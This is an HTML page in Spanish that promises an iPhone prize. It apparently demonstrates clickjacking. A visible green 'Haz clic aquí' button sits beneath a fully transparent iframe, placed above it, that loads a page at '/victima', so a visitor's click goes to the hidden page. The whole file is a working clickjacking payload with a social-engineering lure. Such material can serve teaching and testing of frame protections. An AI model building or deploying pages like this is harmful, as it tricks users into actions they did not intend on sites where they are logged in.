<!DOCTYPE html>
<html>
<head>
    <title>Gana un iPhone 🎁</title>
    <style>
        body {
            text-align: center;
            margin-top: 100px;
        }

        .contenedor {
            position: relative;
            width: 250px;
            height: 80px;
            margin: auto;
        }

        .boton-falso {
            position: absolute;
            width: 250px;
            height: 80px;
            background: green;
            color: white;
            font-size: 20px;
            text-align: center;
            line-height: 80px;
            cursor: pointer;
            z-index: 1;
        }

        iframe {
            position: absolute;
            width: 250px;
            height: 80px;
            opacity: 0;
            z-index: 2;
            border: none;
        }
    </style>
</head>
<body>

<h2>Haz clic para ganar un iPhone 📱</h2>

<div class="contenedor">
    <div class="boton-falso">Haz clic aquí</div>
    <iframe src="/victima"></iframe>
</div>

</body>
</html>